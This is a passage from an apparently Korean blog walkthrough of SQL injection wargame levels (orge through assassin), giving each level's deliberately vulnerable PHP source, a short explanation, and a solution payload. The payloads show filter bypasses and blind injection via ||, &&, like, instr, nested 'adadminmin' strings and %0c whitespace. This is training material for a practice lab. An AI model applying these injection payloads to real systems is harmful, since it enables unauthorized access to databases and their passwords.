1,1#</span><br></pre></td></tr></table></figure><h3 id="7-orge"><a href="#7-orge" class="headerlink" title="7. orge"></a>7. orge</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>(); </span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">dbconnect</span>(); </span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/or|and/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_orge where id=&#x27;guest&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class="line">   </span><br><span class="line">  <span class="variable">$_GET</span>[pw] = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[pw]); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select pw from prob_orge where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;orge&quot;</span>); </span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>테이블에 계정이 여러개 존재하는 상황에서 admin의 비밀번호를 알아내는 문제입니다. 조건식에 쓰이는 and, or이 필터링 되었지만 mysql 에서 and, or는 각각 &amp;&amp;, || 으로 대체 가능합니다. 바꿔 사용하고, like 문을 사용하여 브루트포싱 해보면 답을 알아낼 수 있습니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : pw=&#x27;||id=&quot;admin&quot;&amp;&amp;pw like&#x27;BRUTE_HERE%</span><br></pre></td></tr></table></figure><h3 id="8-troll"><a href="#8-troll" class="headerlink" title="8. troll"></a>8. troll</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>(); </span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">dbconnect</span>(); </span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/admin/&quot;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_troll where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;troll&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>mysql 의 비교문에서는 대소문자를 구분하지 않습니다.<br>따라서 Admin 등을 삽입해 필터링을 우회할 수 있습니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : id=Admin</span><br></pre></td></tr></table></figure><h3 id="9-vampire"><a href="#9-vampire" class="headerlink" title="9. vampire"></a>9. vampire</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>(); </span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">dbconnect</span>(); </span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="variable">$_GET</span>[id] = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[id]);</span><br><span class="line">  <span class="variable">$_GET</span>[id] = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$_GET</span>[id]); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_vampire where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;vampire&quot;</span>); </span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>대소문자 구분없이 admin 문자열을 삭제하고 있습니다.<br>하지만 정규식 변환이 아닌 단순 치환이므로 adadminmin등의 문장을 삽입하여 우회할 수 있습니다.<br>이런 코드는 종종 보안 취약점을 발생시키는데, 제거되는 문장을 알고 있다면 chrome auditor, waf 등을 쉽게 우회할 수 있도록 해주는 마법의 단어가 되기도 합니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : id=adadminmin</span><br></pre></td></tr></table></figure><h3 id="10-skeleton"><a href="#10-skeleton" class="headerlink" title="10. skeleton"></a>10. skeleton</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>(); </span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">dbconnect</span>(); </span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_skeleton where id=&#x27;guest&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27; and 1=0&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;skeleton&quot;</span>); </span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>이전 문제를 모두 해결하였다면, 쉽게 해결할 수 있는 문제입니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Solution1 : pw=&#x27;||id=&quot;admin&quot;#</span><br><span class="line">Solution2 : pw=&#x27;||id=&quot;admin&quot;||&#x27;1</span><br></pre></td></tr></table></figure><h3 id="11-golem"><a href="#11-golem" class="headerlink" title="11. golem"></a>11. golem</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>(); </span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">dbconnect</span>(); </span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/or|and|substr\(|=/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_golem where id=&#x27;guest&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class="line">   </span><br><span class="line">  <span class="variable">$_GET</span>[pw] = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[pw]); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select pw from prob_golem where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;golem&quot;</span>); </span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>or, and, substring, &#x3D; 등을 차단하고 있지만 동일한 기능을 하는 ||, &amp;&amp;, mid, like 으로 대체할 수 있습니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : pw=&#x27;||id like&quot;admin&quot;&amp;&amp;pw like&#x27;%</span><br></pre></td></tr></table></figure><h3 id="12-darkknight"><a href="#12-darkknight" class="headerlink" title="12. darkknight"></a>12. darkknight</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>(); </span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">dbconnect</span>(); </span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[no])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\&#x27;|substr|ascii|=/i&#x27;</span>, <span class="variable">$_GET</span>[no])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_darkknight where id=&#x27;guest&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27; and no=<span class="subst">&#123;$_GET[no]&#125;</span>&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class="line">   </span><br><span class="line">  <span class="variable">$_GET</span>[pw] = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[pw]); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select pw from prob_darkknight where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;darkknight&quot;</span>); </span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>싱글쿼트는 필터링 되어 있지만 쿼트처리가 되어있지 않은 no 파라미터에서 더블쿼트 또는 hex 인코딩를 사용하면 Blind injection이 가능합니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : pw=1&amp;no=1||id like &quot;admin&quot; &amp;&amp; pw like &quot;BRUTE_HERE%&quot;</span><br></pre></td></tr></table></figure><h3 id="13-bugbear"><a href="#13-bugbear" class="headerlink" title="13. bugbear"></a>13. bugbear</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>(); </span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">dbconnect</span>(); </span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[no])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\&#x27;|substr|ascii|=|or|and| |like|0x/i&#x27;</span>, <span class="variable">$_GET</span>[no])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_bugbear where id=&#x27;guest&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27; and no=<span class="subst">&#123;$_GET[no]&#125;</span>&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class="line">   </span><br><span class="line">  <span class="variable">$_GET</span>[pw] = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[pw]); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select pw from prob_bugbear where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;bugbear&quot;</span>); </span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>필터링 되는 단어가 조금 늘어났습니다.<br>지금까지 애용해왔던 like도 필터링 되므로 instr 함수를 사용해 한글자씩 브루트포싱 해 줍시다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : pw=1&amp;no=1||instr(id,&quot;admin&quot;) &amp;&amp; instr(pw,&quot;BRUTE_HERE&quot;)</span><br></pre></td></tr></table></figure><h3 id="14-giant"><a href="#14-giant" class="headerlink" title="14. giant"></a>14. giant</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>(); </span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">dbconnect</span>(); </span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[shit])&gt;<span class="number">1</span>) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\n|\r|\t/i&#x27;</span>, <span class="variable">$_GET</span>[shit])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select 1234 from<span class="subst">&#123;$_GET[shit]&#125;</span>prob_giant where 1&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="number">1234</span>]) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;giant&quot;</span>); </span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>화이트 스페이스 문제입니다.<br>mysql에서는 구분자로서 %09, %0a, %0b, %0c, %0d, %2b 를 사용할 수 있는데<br>%2b는 문맥에 의존적이므로 이 문제에서는 사용이 불가하네요.<br>따라서 %0b, %0c 가 문제의 답입니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : shit=%0c</span><br></pre></td></tr></table></figure><h3 id="15-assassin"><a href="#15-assassin" class="headerlink" title="15. assassin"></a>15. assassin</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>(); </span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">dbconnect</span>(); </span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_assassin where pw like &#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;assassin&quot;</span>); </span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>놀랍게도 패스워드 검증에 like 문이 사용되었습니다.<br>like문에서 %는 정규식의 .* 와 동일한 역할을 합니다.<br>따라서 % 앞에 한글자씩 브루트포싱 해보면 금새 답을 알 수 있습니다.<br>guest 와 admin 계정의 패스워드 앞 부분이 일치하니<br>guest 계정만 나온다고 좌절하지 말고 응답 하나하나 주의깊게 확인합시다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : pw=BRUTE_HERE%</span><br></pre></td></tr></table></figure><h3 id="16-zombie-assassin"><a href="#16-zombie-assassin" class="headerlink" title="16. zombie_assassin"></a>16. zombie_assassin</h3><figure class="highlight 